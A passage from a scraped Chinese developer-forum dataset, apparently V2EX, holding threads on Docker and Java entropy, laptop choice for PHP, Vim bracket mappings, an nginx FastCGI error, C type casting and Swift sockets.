修改就好了啊。或者 exec 也可以的吧", " 试过了，会报错。有空我再研究下直接写在 dockerfile ，最后是用 exec 去里面改的", "说一个可能相关的，曾经在虚拟机里运行一些软件时遇到过随机数熵值不够的问题，可以尝试安装 haveged 解决", " thx ，最后是改 Java path 搞定的", " 改了 securerandom.source", "自己做的 KVM 和阿里云的基于 KVM 的虚机里会碰到该问题。阿里云基于 XEN 的没有碰到该问题。", "\r", " 是吗，我用的是腾讯云的学生机呢"]},
{"content": ["<div class=\"topic_content\">学习数据挖掘快一年了，用的语言是 python 和 R ，但是我看许多公司招聘的时候都需要会 C++， C++对于数据挖掘行业有那么重要吗？还是只是衡量应聘者能力的尺子？</div>"], "reply": "13", "tittle": "数据挖掘岗位的 C++用得多吗？", "comment": ["感觉 C++是算法实现的时候才需要用到的。", "不多吧，不过有些 ML 框架是 C++实现的，如果公司用了这些框架，那可能会要求", "c++可能是用来刷人的。。。", " 嗯，但是 Python 实现数据挖掘的算法也还可以，不懂为什么一定要 C++", " 有道理", "数据岗怎么样也要条件高一点把，要是就学框架那和 web 不就一样了，每个月多拿那么多钱是有原因的。", "多， V2 上像我这样的初级 DATA 方向的 RD 太多了，公司 pv 不大的项目都是 py ，一旦 pv 上去了，都要用 c++重写，各种现有库全都是。\r", "\r", "线上 pipeline 也全是 cpp 的。\r", "用 py 做 pipeline ？那就只能像知乎这种公司一样，吹嘘“我们的 anti spam 流水线从过去的 5s 降低到现在的 500ms 了”，竟然还存在需要运行 5s 的 pipeline ？\r", "我们的 pipeline ，拿到特征，多模型召回， ranking 加起来不到 200ms ，这就是 cpp 的作用。\r", "\r", "好在离线训练还是可以 python ，可以只用 CPP 重写 prediction 代码，包括模型文件的解析和模型的 predict 。", " 不错，现在一般都用的现成的工具，虽然说自己有实现过算法，但是根据需求来编写代码的能力还是不够", " 谢谢！", " python 实现数据挖掘的算法那效率只怕惨不忍睹。\r", "\r", "python 里那些数据处理的库，背后是 c/c++这些做支撑的，不是一定要会的，会的话加分。", "用 CUDA 、 OpenCL 这类需要 C 、 C++功底。", " 嗯，这个倒是，不知道是哪个人说的， python 虽然是慢了一点，但如果不是海量数据的话，那几秒钟差别又怎么会察觉出来呢？大公司不一样，还得要兼顾效率，几毫秒的差别也得考虑", " 也就是有的公司需要重写库？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从来没用过 Mac 本本，又想尝尝鲜，买个 air 试试，听说 Mac 的细节和设计无论是硬件和软件都很不错，自己不拿笔记本玩游戏，因为台式机的配置已经够跑所有游戏了，就是拿笔记本写写 PHP 之类的代码（ V2 貌似 PHP 受鄙视），偶尔用用 GitHub 上开源软件。狗东上逛了一圈，觉得 Mac 的价位已经可以买 i7+256GB SSD 的 Windows 本本了，所以目前有点纠结：</p>\n<ol>\n<li>如果只是写写 PHP 代码和前端 js css 之类的，偶尔用用 GitHub 上的开源软件，浏览一下网页，看看电影之类的， air 比 Windows 本本强的了多少？很人性化吗？</li>\n<li>如果上船，神船的屏幕好不好，因为调试前端页面，需要色彩度分辨较高，貌似神船的屏幕不太好（只是听说）</li>\n<li>三星家的笔记本电池和 NOTE7 是不是同一家的？他家的这款 <a href=\"https://item.jd.com/3275073.html\" rel=\"nofollow\">https://item.jd.com/3275073.html</a> 性价比挺诱人的，就是担心万一放在床上散热不好，万一爆了床烧了是小事，代码没保存就完了</li>\n<li>14 寸 1080p 的屏幕如果保持原始比例是不是字体很小？必须放大才行？</li>\n</ol>\n<p>求好心 V2 们解疑释惑一下</p>\n</div></div>", "<div class=\"topic_content\">感谢好心 V2 们的回答，已买了一款 win 本， i7+8GB+256GB ， Lenovo</div>"], "reply": "145", "tittle": "准备买本了，没多少预算，写 PHP 的到底是换低配 Mac 还是高配 Windows？", "comment": ["高配 Win\r", "一般开发本地进行，如有些扩展 win 下没有，装 linux 虚拟机。然后开共享，一样是本地化的开发体验\r", "性能这东西直接决定了寿命。另外 Mac 下 QQ 很难用", "开发尽量不要 win 吧，比较操蛋", "就记住一条。千万别在 windows 下开发 php 。。\r", "血的教训", "开发不都是跑虚拟机么........\r", "\r", "跟操作系统毛关系", "推荐 macbook Pro ，你现在有电脑用就将就用吧。先存点钱，或者你分期买一个，一个月也没有多少钱。\r", "\r", "不推荐 air ，之前就是我以为写 web 一个 air 够了，还便宜但是到了后面，一堆的配套服务也需要跑起来， air 就很捉急了。还有就是万一你想玩一点别的呢？ air 都不一定跑的动。\r", "\r", "直接上 macbook pro 顶配，没钱就慢慢存，有魄力就先分期买一个用。吃饭的家伙，你懂的。", "我可以回答问题 4 ， 14''1080P 不改缩放的情况下对眼睛确实是种折磨，即使改了缩放大部分应用的字体也会很模糊（微软家的不在此列 Clion 之类也没问题），当放大到 125%的时候不开第三方软件的情况下整个屏幕会非常棒。\r", "我还可以回答问题 2 ，神州的本性价比是最高的，但是问题在于笔记本的体积、重量和续航问题，屏幕需求高建议 xps 。", "高配 win ，双系统， ubuntu ，安装系统环境， linux 绝对是杠杠的", "phper 一枚,已经高配买了 win", "高配 win ，然后跑虚拟机咯", "个人觉得高配的好一点\r", "Mac 上写代码跟 Windows 上写代码其实差别不大", "高配 Windows ，环境可以用 Windows Subsystem Linux ，亲测好用。\r", "\r", "拙作一篇，可供参考： ", "必须高配，其他问题都能解决", "居然还有人受得了 win ， mac 我都受不了一些限制，还是 linux 最好用来开发。", "买个 xps13 然后装个 fedora 或者自己喜欢的。", " #108 什么型号 发一下呗 我也想买一个", "写 php 随便一台笔记本电脑就可以了。有钱就买 MACBOOK ，没有钱买台二手 thinkpad 都不错。", "没法理解用笔记本写代码的人。\r", "小屏幕是不能接受的硬伤。", "高配 win 然后虚拟机里面搞\r", "vagrant 解决所有烦恼", "高配 win 无压力， 剩下的钱还可以配个机械键盘啥的", " 新手想躲坑，求指路", "用过 Mac Pro 15 ，建议买（预算不够，分期也应该买）。由于我习惯 Linux ，现在主力用 Thinkpad t460s ，用了１年，不建议买 Thinkpad 。\r", "\r", "Mac 的好处不是一句话可以说完，虽然我喜欢自由。", " 老哥， mac pro 在此\r", " ", "  ;-) 我指的是 macbook pro 15.4", "强烈推荐 mac ，嗯，就这样。\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "win 下的 php 开扩展开的想死……别问我为什么知道的……", " \r", "赞同，既然 lz 你都说自己没多少预算，还买毛 mac ，装 b 么， win 的本也有帅气性价比高的。加个 vagrant 或者 docker ，就不愁开发环境不适配了。", "高配 win", "win 装 docker 啊，你告诉我什么 php 扩展编译不了?", "如果你对屏幕有要求，强烈推荐 mac book pro", "不要买带 touchbar 的，最低配 macbook pro 就够用了。", "什么，你有台式机？\r", "\r", "那买 12 寸 MacBook ，不过 3 月底可能小更新。", "买什么 air 。。。都快没这个产品线了。。买 macbook 啊。。。", "thinkpad w 系列 p 系列  +内存到 32G 或 64G, 上 i7,  上 linux 。 用个 3-5 年没问题。", "我手里有一个 14 年的 MACPRO ，\r", "13 寸， 128G SSD,8G 内存\r", "\r", "3K 出\r", "出的原因是因为我买了 2016 版本的。", " 这个本子我写了 2 年 PHP 了。", " 这个本子我 14 年双 11 买的。 写了 2 年 PHP 了。", "新版的 macbook 别买 air 没有 Retina 用着不爽", "win 上 php7 的很多扩展不能用！学习的话还是可以的！", "当然是 高配 PC + Linux", " 有些公司没多大地方 人挤人 不是每个公司都有那种能摆一堆东西的桌子\r", "何况。。回家也要加班。。出差也要加班。。是吧。。", "初学者要兼顾前端和视觉享受的话，低配 MAC 改装 Windows 7 系统是比较好的选择。\r", "\r", "玩游戏的话，可以考虑上船，船的高端本还是有用 IPS 屏幕的，还有买中低端船的话，屏幕都是看运气，有的战神 k650d 画质都很不错。", " 但是常用扩展基本上都能用吧，像 swoole 之类的扩展一般普通 php 项目，外包项目都用不上的。", "从 air, macbook, macbook pro 13\"\r", "最后剩下就是 Macbook pro 15\", 屏幕大\r", "如果可以 买旧版 长时间输入比较舒服. \r", "\r", "新版\"ESC\"在 touch bar 上, 用 vim, 是在毫无手感.", "不玩游戏当然是高配 win+docker", "随便到一个公司的码农区看看 \r", "除了公司配发的 win 本,一半以上 mac 吧", "Mac 好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>只有一台 MAC 。\n有时候想实验 分布式等需要多台主机的架构。\n是临时买多台主机、还是装多个虚拟机？\n或者其它的方法，大家能分享一下嘛？</p>\n</div></div>"], "reply": "18", "tittle": "只有一台笔记本，如果做多主机实验？", "comment": ["难道不装虚拟机？", "我一般都是开 VPS 。。", "docker", " 临时开多台？一台一个月，那不是要花很多钱嘛（关键买了、实验之后，空着浪费啊）。", " 如果需要测试性能，那么在一台电脑上测试，不就没意义了嘛。", "按量付费的那种 vps ，用完就销毁", "阿里云呀 aws 呀 digitalocean 呀 按小时计费", " 按小时付费，每小时几毛美金，用完就删", " docker+1 或者可以在 do 开虚拟机 按小时收费的。最近他们发布了 load balancer 或许你能用上", " 谢谢。\r", "同时也谢谢其它各位同学", " 性能测试及时你使用 docker 也一样测试不出来的，还是需要用到物理机才能进行更好更全面的测试。", "虚拟机是最灵活，最方便，最省钱的方案", "看情况 如果是磁盘等硬件性能测试，那么最好在真实环境，如果只是跑程序的话虚拟机足够，有闲钱的话可以搞一台小主机怼大点内存，不用显示器，装个 Linux 专门跑虚拟机，配合 vagrant 还是不错的", "青云之类都可以按秒付费", "EC2 free tier back 的 ECS", "各种云平台", "单机 docker\r", "预算许可，使用按需付费的云服务：青云, AWS, DigitalOcean", "docker"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近突然对类型转换多了一些理解. 这些理解如果用一句话来总结就是: 类型即协议.\n一个类型就是一个如何存取数据的协议. 而类型的转换,则是说明数据读取的协议转换成另一个适用的协议.\n对 C 语言来说,数据类型则是针对内存布局的协议.\n下面以 C 语言为例.</p>\n<ol>\n<li>\n<p>如下所例,虽然 Age 是一个结构, 但是其内存布局只是一个 int 类型的数据布局而已.所以完全可以直接使用 int 数据类型存取协议来操作这个 age 结构.\n如下:</p>\n<pre><code>typedef struct Age{\n    int age;\n} Age;\n\nint main(int argc, const char * argv[]) {\n    Age age = { 3 };\n    int *age2 = (int *)&amp;age;\n    printf(\"age2=%d\\n\", *age2); // age2=3\n    *age2 = 5;\n    printf(\"age.age=%d\\n\", age.age);// age.age=5\n    return 0;\n}\n</code></pre>\n</li>\n<li>\n<p>当 Age 有多个成员时,我们还是可以以一个 int 指针来操作对应的结构值.如下.  C 语言中结构的成员的内存布局是按顺序的. 我们也就可以按相应的\t内存顺序存取相应的数据.</p>\n<pre><code>typedef struct Age{\n    int age;\n    int month;\n} Age;\n\nint main(int argc, const char * argv[]) {\n    Age age = { 3,6 };\n    int *age2 = (int *)&amp;age;\n\n    printf(\"age2=%d\\n\", *age2);//age2=3\n    *age2 = 5;\n    printf(\"age.age=%d\\n\", age.age);//age.age=5\n    printf(\"age.month=%d\\n\", age.month);//age.month=6\n    *(age2 + 1) = 11;\n    printf(\"age.month=%d\\n\", age.month);//age.month=11\n    return 0;\n}\n</code></pre>\n</li>\n<li>\n<p>将一个整数赋值给一个 8 位的整型变量,就相当于这个整数的二进制表示的前 8 位塞进对应内存 8 bit 的空间.(不考虑符号)</p>\n</li>\n</ol>\n</div></div>"], "reply": "4", "tittle": "类型与强制类型转换:感想 1", "comment": ["Everything is just zero and ones.", "从汇编代码看就非常清楚了", "看过最精辟的理解应该是：“类型”决定了能做的“操作”。", "c 语言类型这么弱，用起来也就浮点和整型差异。要举也举函数指针的例子嘛"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从开始写代码的时候，老师就教如果写括号，要先写括号，再写括号里面的内容</p>\n<p>例如下面的代码：</p>\n<ul>\n<li>while((i &gt;&gt; 1) &gt; 0)</li>\n</ul>\n<p>普通的 text 的书写顺序是：(&lt;-代表左箭头，-&gt;代表右箭头)</p>\n<ul>\n<li>while()&lt;-()&lt;-i &gt;&gt; 1-&gt; &gt; 0</li>\n</ul>\n<p>在 Vim 的书写顺序是什么呢？\n这是我的写法 感觉好复杂- -</p>\n<ul>\n<li>while()Esci()Escii &gt;&gt; 1Esclli &gt; 0</li>\n</ul>\n</div></div>"], "reply": "33", "tittle": "Vim 党 书写括号的正确方式是什么", "comment": ["少年, 你需要插件 surround.vim", "while\r", "左手小拇指按住 shift ，打()；\r", "左手无名指按 ESC ，右手中指按 I ，打()里面的代码；\r", "()里条件打完，同操作按 ESC ，左手小拇指按住 shift ，同时左手中指按$，同操作按 I ，再进行其他输入。。\r", "这个指法如何 @", "别扮酷用 hjkl 来移动光标嘛。。。有专门的上下左右撒", "少年, 你需要插件 unimpaired.vim", " 专门的上下左右实在是鸡肋...hjkl 可以手指不用离开基础键就搞定移动. 否则手来回移来移去浪费时间.", "这种插件很多，我觉得你那样也不是很别扭比去按上下左右好多了", "善用各种 map 即可。\r", "\r", "譬如下面这个 map ，\r", "当你处于 i 模式输入 $t ，会插入书名号 <> ，且光标会移动到 <> 中间。（不需要 Esc 后调整光标位置）\r", "当你处于 v 模式输入 $t ，会用书名号 <> 立即包裹你选中的部分。\r", "```\r", "vnoremap $t <esc>`>a><esc>`<i<<esc>\r", "inoremap $t <><esc>i\r", "```\r", "\r", "括号同理。", "可以用 Autokey 自己编一个， WIn + 1 插入一对括号， Win + 2 插入两个括号， WIn + Shift + 1 插入<>等，插入后自动移动到中间位置。编好了每个编辑器都能通用。", "配置自己的代码习惯吧， vim 里面默认$是行尾，但是$的位置确实有点尴尬，我自己就配置了两个快捷键， le,跳至行尾， lb 跳至行首，同时还可配置文本首尾的跳，还是比较方便的。 vimrc 如下，多练习就好了，我一直觉得码字的速度不是影响写代码的啊。。。。\r", "nmap lb ^\r", "nmap le $\r", "nmap lt H\r", "nmap ln L\r", "nmap lm M", "while () <c-[>isomething<c-[>Asomthing", "先装 surround.vim,再定义^l 为右键", "可以试试 ctrl+o ，临时进可视模式", "对的，我就是用那种最复杂的方式写括号，然后 ESC 移动再插入的。\r", "插件帮我闭合了我还不习惯！", "难道不是按 (，然后直接出 (光标) \r", "\r", "现在连手机输入法都是直接出一对啦……", "不应该是各语言的自动 snippet 插件搞定吗？", "我自己没什么需求，全是手动打括号。\r", "```\r", "inoremap jk <Esc>\r", "inoremap <Esc> <Nop>\r", "```\r", "while ()jki<code-in>jkla<code-after>\r", "\r", "\r", "已经够简单了。如果非要搞一个 mapping 来省这么一点点力气，我这儿有个土法炮制刚出炉的：\r", "```\r", "inoremap ( (<Esc>:call AutoParen(nr2char(getchar()))<CR>\r", "function! AutoParen(char)\r", "  call feedkeys('a', a:char, 'n')\r", "  if a:char != ')'\r", "    call feedkeys(\")\\<Esc>i\", 'n')\r", "  endif\r", "endfunction\r", "```\r", "\r", "这要智能一些，将连续输入 '()' 作为例外处理了。\r", "while (<code-in>jkla<code-after>\r", "少打 ')jki' 几个字。", "“从开始写代码的时候，老师就教如果写括号，要先写括号，再写括号里面的内容”\r", "这个是怕你写错括号的匹配吗？感觉意义不大，我都是分开打的。一般括号里面的内容不多，都不会漏的。万一真漏了，编译（ cpp ）或者运行（ python ）时都会提醒的\r", "不过你那样写也没问题，并不是很麻烦", "typo:\r", "  call feedkeys('a', a:char, 'n')\r", "correct:\r", "  call feedkeys('a'. a:char, 'n')", " 你可以试一下去写 Lisp :D", "感觉 lz 更需要 ", "同问", "天哪， VIM 打个括号竟然这么麻烦！ Emacs 围观 ing", "习惯之后感觉会记得没闭合的括号吧, 难道是我写的都太简单了...", "自动补全配置，输入左括号自动补全后括号，并进入 insert 模式\r", "   \r", " \" 括号自动补全\r", "    func! AutoClose()\r", "        :inoremap ( ()<ESC>i\r", "        :inoremap \" \"\"<ESC>i\r", "        :inoremap ' ''<ESC>i\r", "        :inoremap { {}<ESC>i\r", "        :inoremap [ []<ESC>i\r", "    endf\r", "\r", "不谢~", "哦，还得补上这个执行语句：\r", "``` \r", "    au FileType php,c,python,javascript,html,css exe AutoClose()\r", "```", "已经脱离纯 vim 了\r", "一直是 idea+vim 插件的方案\r", "idea 下的 vim 操作还是相对接近原生 也有自己的可配置文件\r", "又能使用 idea 这类 ide 带来的便利", "何不尝试 SpaceVim. \r", "SpaceVim 主页 ", "\r", "SpaceVim 文档 ", "\r", "\r", "当然你也可以看这篇博客，如何打造一个 Java IDE\r", "\r", "在 Vim 下一直习惯先打开括号、打完内容、再打闭括号。`set showmatch` 之后，漏打多打闭括号都不太可能。\r", "autoclose 类的插件没有用过。如果能做到 idea 系的效果也是不错的：输入开括号时自动在光标后添加闭括号，若手工再输入闭括号则自动覆盖（相当于向右移动光标）。这样在关注括号里内容时可以省略输入闭括号，在需要输入括号后内容时可以最大限度避免思路中断。", "忘了从哪个博客里看到的，用的挺顺手的\r", "\r", "inoremap ( ()<esc>i\r", "inoremap ) <c-r>=ClosePair(')')<cr>\r", "inoremap [ []<esc>i\r", "inoremap ] <c-r>=ClosePair(']')<cr>\r", "inoremap { {}<esc>i\r", "inoremap } <c-r>=ClosePair('}')<cr>\r", "inoremap (<cr> (<cr>)<esc>O\r", "inoremap [<cr> [<cr>]<esc>O\r", "inoremap {<cr> {<cr>}<esc>O\r", "\r", "function! ClosePair(char)\r", "    if getline('.')[col('.')-1] == a:char\r", "        return \"\\<Right>\"\r", "    else\r", "        return a:char\r", "    endif\r", "endfunction", "写个括号。没必要整的这么复杂吧。。直接顺序手打 ( . ) 下就行了。。", "谁让你们一开始就把括号闭起来的啦，最后闭合一点问题都没有。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我买过一个英文名的洋垃圾电力猫，次卧到主卧室之间隔一个客厅（家里也就 100 平方），两端联通后 ping 的时延 6-7ms 这样</p>\n<p>大品牌的电力猫也这样吗？有谁用的说一下时延呗</p>\n</div></div>"], "reply": "12", "tittle": "大品牌电力猫时延如何？", "comment": ["这玩意都差不多 受电网噪声影响", "正常，高通方案的话快的时候 2-3ms 左右，慢的时候 10ms 左右，#1 说得对", "能拉网线还是老老实实拉网线吧，一劳永逸。", "还是拉根带铠光纤吧...不生锈，不氧化，一劳永逸...", "打车求问跨电表到底可以吗，我爸妈住楼下，考虑在京东买一个试一下。。。", " 不可以，这玩意不可以跨电表用", "我觉得主要看家庭用电设备情况以及电网布置情况。\r", "我买的华为的电力猫，延时很低（基本看不出来跟网线直连的区别）\r", "但是不稳定，经常掉线。\r", "我觉得原因是有些用电设备会干扰电力线载波通讯。", " 是呀，可是网线要过两个门，不知道怎么处理", " 如果这也可以的话，理论上隔壁老王也可以蹭你的网", " 那得在我这边插个东西啊", "弄个中继，或者 wifi 放大器。", "要看线路情况有没有干扰，并不是看电力猫性能，再好的电力猫线路复杂而干扰照样延时漂移！！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个关于 nginx 配置的问题，配置一个 php 网站，页面总是输出 File not found.，查看 nginx log 中报错：</p>\n<pre><code>FastCGI sent in stderr: \"Primary script unknown\" while reading response header from upstream\n</code></pre>\n<p>nginx 配置如下：</p>\n<pre><code>erver {\n    listen 80;\n    server_name abc.com;\n    root \"/root/work/abc/public\";\n\n    index index.html index.htm index.php;\n\n    charset utf-8;\n\n    location / {\n        try_files $uri $uri/ /index.php?$query_string;\n    }\n\n    \n\n    location = /favicon.ico { access_log off; log_not_found off; }\n    location = /robots.txt  { access_log off; log_not_found off; }\n\n    access_log off;\n    error_log  /var/log/nginx/abc.com-error.log error;\n\n    sendfile off;\n\n    client_max_body_size 100m;\n\n    location ~ \\.php$ {\n        fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n        fastcgi_pass unix:/var/run/php/php5.6-fpm.sock;\n        fastcgi_index index.php;\n        include fastcgi_params;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n\n        fastcgi_intercept_errors off;\n        fastcgi_buffer_size 16k;\n        fastcgi_buffers 4 16k;\n        fastcgi_connect_timeout 300;\n        fastcgi_send_timeout 300;\n        fastcgi_read_timeout 300;\n    }\n\n    location ~ /\\.ht {\n        deny all;\n    }\n\n}\n</code></pre>\n<p>查了一下，大多数给出的解决方法都是 fastcgi_param 改成 document_root ，但是我这个现在已经是这个了。</p>\n<p>还有一个怀疑是 php-fpm 的权限问题，但是不知道怎么解决和是否是这个问题：</p>\n<pre><code>root     20618  0.0  0.4 317860 18816 ?        Ss   18:11   0:00 php-fpm: master process (/etc/php/5.6/fpm/php-fpm.conf)                      \nwww-data 20620  0.0  0.1 317860  6828 ?        S    18:11   0:00 php-fpm: pool www                                                            \nwww-data 20621  0.0  0.1 317860  6828 ?        S    18:11   0:00 php-fpm: pool www                                                            \nroot     24811  0.0  0.0  11744   932 pts/7    S+   19:33   0:00 grep --color=auto php-fpm\n</code></pre>\n<p>所以想请教一下有没有人遇到类似的问题，或者有没有解决方案？</p>\n</div></div>"], "reply": "9", "tittle": "求助 nginx 配置问题-FastCGI sent in stderr: \"Primary script unknown\"", "comment": ["1.给我看下你 php-fpm 的配置\r", "2.请确定 /var/run/php/php5.6-fpm.sock 这个在 php-fpm 配置正确\r", "3.注意 php 和 nginx 执行权限", "  \r", " php-fpm 配置是默认配置 [php-fpm.conf]( ", ")  \r", "/var/run/php/php5.6-fpm.sock 这个配置应该是正确的，存在这个文件，开始有报过这路径错误日志，我改过来了。  \r", "现在是怀疑第三点，但是不知道怎么调试。", "/etc/php/5.6/fpm/pool.d/www.conf 文件中 listen 字段是怎么配置的\r", "\r", "nginx 的运行用户和户组是什么\r", "\r", "另外你把 nginx 的 “ root ” 设置在 root 目录， nginx 或者 php-fpm 有权限读取吗", "首先，既然 nginx 能收到 fastcgi 发来的错误信息，那就根本不需要考虑 nginx 和 php-fpm “能否通信”的问题了", "我比较怀疑的是 fastcgi_split_path_info 的问题\r", "建议你用 socat 冒充 php 在那 unix socket 上监听，查一下 nginx 发来的各个 fastcgi_param 的值到底是什么；或用 strace 跟踪一下传递过来的字符串\r", "\r", "或者是去掉 fastcgi_split_path_info 试一下", " \r", " \r", "\r", "把项目目录移动到了 /var/www/ 中运行正常了，但是还是没有找到原因是什么。", " 如你所说那样就是因为 nginx 和 php-fpm 没有读取 /root 下文件的权限导致的问题。", " 我把 root 下项目对应的文件夹权限打开了，也不可以？", " 移除就修复了，说明你的 documen_root 有问题或者没权限\r", "不仅要“下对应的文件夹”还要“ root 本身”的整个目录树的权限都打开才可以"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>CASB 的定义如下</p>\n<blockquote>\n<p>Cloud access security brokers (CASBs) are on-premises, or cloud-based security policy enforcement points, placed between cloud service consumers and cloud service providers to combine and interject enterprise security policies as the cloud-based resources are accessed. CASBs consolidate multiple types of security policy enforcement. Example security policies include authentication, single sign-on, authorization, credential mapping, device profiling, encryption, tokenization, logging, alerting, malware detection/prevention and so on.</p>\n</blockquote>\n<p>想问一下大家都是怎么做技术选型的？\n求教经验。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "论坛上有童鞋做 CASB(Cloud Access Security Broker) 的项目的吗？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>容器圈头条</h1>\n<p>汇总一周容器圈热点资讯，让开发者了解最 <strong>in</strong> 的容器技术，让企业熟知最实时的国内外容器行业动态，欢迎关注。</p>\n<h3>一、 Docker 4 周年生日会</h3>\n<p><strong>摘要：</strong>社区作为 Docker 的核心元素，得益于众多维护者，贡献者，舰长，成员，组织者以及整个社区的辛勤付出，各种规模的公司和行业也纷纷将 Docker 平台投入到产品环境中。为了表达对大家的感谢， Docker 和线上会议的组织者将在世界各地举办 Docker 4 周年生日庆祝会，这样的庆祝也成为 Docker 一直以来的传统。今年的庆祝会将于 2017.03.13-2017.03.19 举行，大家可以前来学习，布道，庆祝，品味点心，或者来一次有纪念意义的 “ docker ” 自拍。</p>\n<p>想要了解更多关于 Docker 4 周年生日会的内容，<a href=\"https://blog.docker.com/2017/02/announcing-docker-birthday-4-spreading-docker-love/\" rel=\"nofollow\">点此查看详情</a>：</p>\n<p><img alt=\"\" src=\"https://i2.wp.com/blog.docker.com/wp-content/uploads/Docker-bday-4.jpg?resize=940%2C1024&amp;ssl=1\"></p>\n<p><strong>点评：</strong> Docker 设计初期，只是给运维人员的一个工具。然而，到现在 Docker 已经成为连接开发和运维人员，连接开源和企业，连接云端和数据中心，连接全新的前沿架构和老式软件的方法论。成长的背后由一个非常庞大且多元化的社区驱动，这里有开发者、运维人员、企业、狂热爱好者、新手以及专家。小编相信， Docker 在接下来会厚积薄发，继续前行。</p>\n<p>⚠ Tips ：作为 Docker 的好伙伴， DaoCloud 也将为中国 Docker 爱好者带来多城 Docker 四周年生日派对，届时欢迎大家踊跃参与！</p>\n<h3>二、 清理容器废弃资源和碎片</h3>\n<p><strong>摘要：</strong> Docker 1.13 版本增加了一些非常好用的 CLI 命令，使开发环境变得更加干净简洁。随着时间的推移，您或许亲身经历过这样的状况，那就是开发环境变得越来越混乱，里面不仅有未使用的容器，悬挂的 Docker 镜像，还有废弃的存储卷和被遗忘的网络。所有这些过期的项目都占用了系统宝贵的资源，最终导致环境无法使用。</p>\n<p>在前面的文章中，我展示了使用 docker rm 和 docker rmi 命令来保持开发环境的干净简洁。这样做虽然可以解决一部分问题，但是这些命令是私有的、冗长的或很难记住的。为此， Docker 1.13 引入了可以直接使用的新命令，它们简单又实用，比如管理命令：</p>\n<ul>\n<li>system</li>\n<li>container</li>\n<li>image</li>\n<li>plugin</li>\n<li>secret</li>\n</ul>\n<p>这些非常有用的命令把过期的项目清理出开发环境，有效避免了系统资源的浪费。</p>\n<p><a href=\"https://lostechies.com/gabrielschenker/2016/12/12/containers-cleanup-your-house-revisited/\" rel=\"nofollow\">点此查看详情</a></p>\n<p><img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_jpg/1DjrTiaica04nNK4bjoxHq0tia7RnstLdGTb5tcGRNxibmXY9Libz5LZmWYWnmUzo832LdW4sERhiaC9IpJa1zM9VXWA/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n<p><strong>点评：</strong> 在 docker 应用生态环境中，容器的生成和销毁是很频繁的，势必会导致 docker 在运行的生命周期中生成一些垃圾碎片。有了碎片，就需要有好的方案进行处理。在以上这些命令中，小编印象最深刻的是 docker system prune -a 命令，因为它简单粗暴，可以同时删除：</p>\n<ul>\n<li>all stopped containers</li>\n<li>all volumes not used by at least one container</li>\n<li>all networks not used by at least one container</li>\n<li>all images without at least one container associated to them</li>\n</ul>\n<h3>三、 探索 Docker 1.13 存储插件和挂载传播</h3>\n<p>Docker 1.13 最激动人心的特性之一，就是新的插件管理系统。它在 1.12 尚处于实验阶段，但是现在已经融合成一个完整的功能。为什么管理插件非常重要？最终的目标是快速轻松地利用插件的可扩展性。 Docker 的任务是让所有插件都像容器一样被管理和运行，把 Docker Hub 作为集中资源，让插件更可用，从而推动过程标准化。探究容器挂载， EX-Ray 从一个容器的需求出发来挂载 volume ，并且让这些挂载点对于底层的操作系统（ OS ）可用。为了让挂载点在容器里对 Docker 运行的主机可用，利用了 Linux 的 shared 捆绑挂载。</p>\n<p><a href=\"https://blog.codedellemc.com/2017/02/02/deep-dive-docker-1-13-storage-plugins-propagated-mounts/*\" rel=\"nofollow\">点此查看详细</a></p>\n<p><img alt=\"\" src=\"https://blog.codedellemc.com/wp-content/uploads/2017/02/Pasted-image-at-2017_02_02-08_09-AM.png\"></p>\n<p><strong>点评：</strong> Docker 插件是增强 Docker 引擎功能的进程外扩展。这就表示，插件不会运行在 Docker daemon 中。你可以随时随地（如果需要可以在另一台主机上）启动你的插件。你只需要通过 Plugin Discovery （我们后面会深入讨论）通知 Docker daemon 这儿有一个新的插件可用即可。进程外体系的另一个优点就是你甚至可以不用重新建立一个 Docker daemon 来增加一个插件。目前已经有授权、存储卷驱动、网络驱动、 Ipam 驱动等插件。</p>\n<p><strong>这一期的容器圈头条就到这里，欢迎下期再会。</strong></p>\n<p><strong>作者介绍 | Evelyn</strong></p>\n<p>DaoCloud 容器技术开源团队成员，曾在 Intel DCG 部门担任 Cloud Engineering, 对分布式调度框架 Mesos 有深入学习，对集群资源管理有一定经验，目前致力于 Docker 容器技术的研究和实践。 Evelyn 所在的容器技术开源团队，在 DaoCloud 主要负责容器生态的开源工作。</p>\n</div></div>"], "reply": "2", "tittle": "Docker 4 周岁生日派对全球联动；探索 Docker 1.13 存储插件和挂载传播 |『道客船长的航海日志』", "comment": ["厉害了=。= 支持", "不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>背景</h3>\n<p>最近在一个 iOS 项目中要用到 Socket 编程. Foundation 没有 Socket 模块. CoreFoundation 倒是有,但是我一直挺讨厌 CoreFoundation 的.看了一眼 CFSocket 相关 API,有种想吐的感觉. 作罢.</p>\n<h3>理想的样子.</h3>\n<p>Swift 具有跟 C 语言互操作的特性,可以直接调用 C 库函数 . Socket C 库的 API 看起来挺简洁的,决定试着封装一下. 理想中的结果应该像下面的代码一样,简洁明了.</p>\n<pre><code>        let addr = InternetAddress(hostname: \"httpbin.org\",\n                                 port: 80)\n      let socket = try TCPInternetSocket(address: addr)\n      try socket.connect()\n      try socket.send(data: \"GET /\\r\\n\\r\\n\".toBytes())\n      //receiving data\n      let received = try socket.recv()\n      //converting data to a string\n      let str = try received.toString()\n      //yay!\n      XCTAssertTrue(received.starts(with: \"&lt;!DOCTYPE html&gt;\".toBytes()), \"Instead received: \\(str)\")\n      try! socket.close()\n</code></pre>\n<h3>初遇 <code>socket</code></h3>\n<p>在 Swift 中只要 <code>import Darwin</code> 就可以使用系统的 C 库了.\n创建一个 macOS 命令行项目, 创建一个 Swift 源文件,直接就写.\n输入 <code>socket</code> 